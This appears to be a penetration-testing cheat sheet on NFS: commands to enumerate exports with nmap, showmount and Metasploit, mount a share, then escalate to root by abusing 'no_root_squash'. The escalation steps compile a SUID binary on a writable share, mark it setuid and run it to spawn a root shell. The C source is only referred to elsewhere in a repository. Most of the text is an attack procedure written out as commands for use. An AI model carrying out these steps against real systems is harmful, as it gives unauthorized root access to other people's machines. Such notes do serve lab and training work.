## Enumeration

    nmap --script nfs-ls,nfs-showmount,nfs-statfs <IP>
    showmount -e <IP>

##### Metasploit

    use auxiliary/scanner/nfs/nfsmount

### 1) Create a directory on the attacking machine

    sudo mkdir /mount/

### 2) Mount to the directory just created

    sudo mount -t nfs <IP>:<PATH> /mount/ -o nolock

    ls -la /mount/

### 3) Confirm mount

    mount <PATH>

# Example:

## 

    cat /etc/exports

# Critical element: "no_root_squash" on a writable share (SUID bit set file create) or fsid=0/fsid=root

### 1: 

    showmount -e IP

### 2: 

    sudo mkdir /tmp/backups

### 3: 

    mount -o rw IP:/writable_share /tmp/backups

### 4: Write a bash shell that spawns root (Rootshells directory in repo)

### 5: 

    gcc nfs.c -o nfs -w 

### 6: 

    chmod +s nfs

### 

    ./nfs
